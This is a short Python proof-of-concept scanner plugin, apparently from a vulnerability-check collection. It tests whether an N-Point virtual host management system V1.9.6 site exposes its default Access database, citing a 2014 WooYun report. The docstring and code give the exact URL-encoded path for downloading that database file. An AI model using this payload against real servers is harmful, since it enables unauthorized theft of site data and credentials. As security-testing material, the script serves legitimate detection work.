#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: N点虚拟主机管理系统V1.9.6版数据库下载漏洞
referer: http://www.wooyun.org/bugs/wooyun-2014-061151
author: Lucifer
description: N点虚拟主机管理系统默认数据库名#host # date#196.mdb。url直接输入不行,这里替换下#->%23 空格->=,即可下载数据库文件。
'''
import sys
import requests

class npoint_mdb_download_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/host_date/%23host%20%23%20date%23196.mdb"
        vulnurl = self.url + payload
        try:
            req = requests.head(vulnurl, headers=headers, timeout=10, verify=False)
            if req.headers["Content-Type"] == "application/x-msaccess":
                return "[+]存在N点虚拟主机管理系统数据库下载漏洞...(高危)\tpayload: "+vulnurl
            else:
                return "[-]no vuln"

        except:
            return "[-] ==>连接超时"

if __name__ == "__main__":
    testVuln = npoint_mdb_download_BaseVerify(sys.argv[1])
    testVuln.run()